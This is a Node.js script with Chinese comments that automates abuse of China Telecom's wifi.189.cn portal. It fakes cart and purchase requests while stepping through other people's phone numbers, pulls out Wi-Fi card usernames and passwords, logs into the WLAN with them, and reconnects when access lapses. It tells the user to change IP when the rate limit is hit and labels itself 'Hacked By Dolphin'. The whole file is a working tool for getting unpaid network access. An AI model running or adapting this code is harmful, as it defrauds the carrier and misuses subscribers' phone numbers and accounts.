var http = require('http');
var https = require('https');
var querystring = require('querystring');
var colors = require('./node_modules/colors');
var cheerio = require('./node_modules/cheerio');

var colorConsole = function (str, color) {
    // 彩色输出
    var colorful = str[color];
    console.log(colorful ? colorful.bold : str);
};

var httpReq = (function (querystring, http) {
    var createOpt = function (opt) {
        var options = {
            method: 'POST',
            host: opt.host || 'wifi.189.cn',
            path: opt.path || '/',
            headers: {
                'Content-Type': 'application/x-www-form-urlencoded',
                'Content-Length': querystring.stringify(opt.contents).length
            }
        };
        if (opt.cookie) {
            options.headers.cookie = opt.cookie;
        }
        return options;
    };

    var post = function (opt, cb) {
        // 发起 POST 请求
        // callback: object response, string data
        var req = http.request(createOpt(opt), function (res) {
            res.setEncoding('utf8');
            var data = '';
            res.on('data', function (chunk) {
                data += chunk;
            }).on('end', function () {
                cb(res, data);
            });
        });

        req.on('error', function (e) {
            colorConsole('请求出错: ' + e.message + ',请检查网络连接\n', 'red');
        });

        req.write(querystring.stringify(opt.contents)); // 写入请求内容
        req.end();
    };

    var get = function (url, cb) {
        // 发起 GET 请求
        // callback: object response, string data
        var req = http.get(url, function (res) {
            res.setEncoding('utf8');
            var data = '';
            res.on('data', function (chunk) {
                data += chunk;
            }).on('end', function () {
                cb(res, data);
            });
        });

        req.on('error', function (e) {
            colorConsole('请求出错: ' + e.message + ',请检查网络连接\n', 'red');
        });
    };

    return {
        post: post,
        get: get
    };
})(querystring, http);

var linkStart = (function (httpReq) {
    var init = {
        cookie: undefined,
        phone: undefined,
        loginUrl: null
    };

    var openReq = function (curStatus) {
        // 发起请求，得到 cookie
        colorConsole('\n-->\n开始发起请求', 'yellow');
        curStatus = curStatus || init; // 重新发起请求时直接从 init 获取数据

        init.phone = curStatus.phone;
        init.loginUrl = curStatus.loginUrl;

        if (init.cookie) {
            colorConsole('已存在 cookie：' + init.cookie + '\n', 'cyan');
            return addGood(); // 已存在 cookie 则直接进行下一步
        }
        httpReq.get('http://wifi.189.cn/service/index.jsp', function (res) {
            var cookie = res['headers']['set-cookie'][0].split(';')[0];
            init.cookie = cookie;
            colorConsole('获得的 cookie：' + cookie + '\n', 'cyan');
            addGood(); // 触发 addGood 请求
        });
    };

    var addGood = function () {
        // 向购物车添加物品
        colorConsole('开始模拟向购物车添加物品...\n', 'yellow');

        var options = {
            path: '/service/cart.do',
            cookie: init.cookie,
            contents: {
                method: 'addGood',
                confirm: 'yes',
                cardId: 1,
                type: 1,
                count: 1
            }
        };

        httpReq.post(options, list);
    };

    var list = function () {
        // 打开购物车，使请求有效化
        colorConsole('打开购物车，使请求有效化...\n', 'yellow');

        var options = {
            path: '/service/cart.do',
            cookie: init.cookie,
            contents: {
                method: 'list'
            }
        };

        httpReq.post(options, getOrder);
    };

    var getOrder = function () {
        // 获取订单号
        colorConsole('开始获取订单号，手机号：' + init.phone + '...\n', 'yellow');

        var options = {
            path: '/service/user.do',
            cookie: init.cookie,
            contents: {
                method: 'buy',
                confirm: 'yes',
                shopCartFlag: 'shopCart',
                cardType: 1,
                cardPayType: 'yi',
                user_phone: '',
                smsVerifyCode: '',
                isBenJi: 'no',
                phone: init.phone,
                phone_1: init.phone
            }
        };

        httpReq.post(options, function (res, data) {
            if (data[0] === '1') {
                // 得到订单号，开始尝试登录
                var orderId = data.split(',')[1];
                colorConsole('得到的订单号：' + orderId + '\n', 'cyan');
                return getPwd(orderId);
            }
            if (data.indexOf('购物车为空') !== -1) {
                // 若没进行购物车添加，则重新发起请求
                colorConsole('购物车为空，将重置 cookie 后再次尝试！', 'magenta');
                delete init.cookie;
                return openReq();
            }
            // 否则递增电话号码重试
            colorConsole(data.split(',')[1] + ' || 没有得到订单号，继续下一组尝试...\n', 'grey');
            return getOrder();
        });

        process.send(++init.phone); // 为下次计算做准备
    };

    var getPwd = function (orderId) {
        // 获取帐密
        colorConsole('开始获取账号密码...\n', 'yellow');

        var options = {
            path: '/clientApi.do',
            contents: {
                method: 'get10mCard',
                orderId: orderId
            }
        };

        httpReq.post(options, function (res, data) {
            colorConsole('收到的数据：' + data + '\n', 'cyan');
            if (data.indexOf('次数过多') !== -1) {
                return colorConsole('已达到当日请求数上限（50次），请手动刷新 IP\n', 'red');
            }
            var t = data.split(','); // 获取有效信息
            if (t[4] && t[5]) {
                hackLogin(t[4], t[5]);
            } else {
                colorConsole('未获取到，开始下一组尝试...\n', 'grey');
                getOrder();
            }
        });
    };

    var hackLogin = (function () {
        var isSecondTry = false; // 两次尝试计数

        var checkNet = function (cb) {
            // 检测网络是否连接上
            // callback: boolean isOnline
            httpReq.get('http://www.baidu.com', function (res) {
                if (res.statusCode !== 200) {
                    colorConsole('网络断开，开始下一组尝试...\n', 'grey');
                    getOrder();
                } else {
                    setTimeout(checkNet, 10000); // 每十秒检测一次
                }
            });
        };

        var checkLogin = function (uname, pwd, xml) {
            var $ = cheerio.load(xml, {
                xmlMode: true
            });
            var loginStatus = $('ResponseCode').text();

            if (loginStatus && parseInt(loginStatus) === 50) {
                colorConsole('登录成功！八分钟后开始检查连接状态\t' + new Date().toTimeString().slice(0, 8) + '\n\n======= Hacked By Dolphin With Node.js =======\n', 'green');

                isSecondTry = false; // 重置计数

                setTimeout(function () {
                    colorConsole('开始检查网络连接...\n', 'magenta');
                    checkNet();
                }, 480000); // 八分钟触发定时器
            } else {
                if (isSecondTry) {
                    // 两次登录都失败就放弃吧
                    colorConsole('第二次登录失败，开始下一组尝试...\n', 'grey');
                    isSecondTry = false; // 重置计数
                    getOrder();
                } else {
                    // 电信渣服务器可能不能即时处理分配到的账号密码
                    colorConsole('登录失败，三秒后再次尝试登录...\n', 'magenta');
                    setTimeout(function () {
                        isSecondTry = true; // 标记第二次尝试
                        login(uname, pwd);
                    }, 3000);
                }
            }
        };

        var login = function (uname, pwd) {
            // 登录
            colorConsole('开始登录...\n', 'yellow');

            var contents = {
                UserName: uname + '@wlan.sh.chntel.com',
                Password: pwd
            };

            contents = querystring.stringify(contents);

            var options = {
                method: 'POST',
                host: init.loginUrl.host,
                path: init.loginUrl.path,
                headers: {
                    'User-Agent': 'CDMA+WLAN',
                    'Content-Type': 'application/x-www-form-urlencoded',
                    'Content-Length': contents.length
                }
            };

            var req = https.request(options, function (res) {
                res.setEncoding('utf8');
                var xml = '';
                res.on('data', function (chunk) {
                    xml += chunk;
                }).on('end', function () {
                    checkLogin(uname, pwd, xml);
                });
            });

            req.on('error', function (e) {
                colorConsole('请求出错: ' + e.message + ',请检查网络连接\n', 'red');
            });

            req.write(contents);
            req.end();
        };

        return login;
    })();

    return openReq;
})(httpReq);

// 进程会话
process.on('message', function (curStatus) {
    if (curStatus.crashed) {
        colorConsole('\n主进程已重新启动！\n', 'yellow');
    }

    linkStart(curStatus);
}).on('uncaughtException', function (err) {
    // 异常抛出
    colorConsole(err.stack, 'red');
    process.exit();
});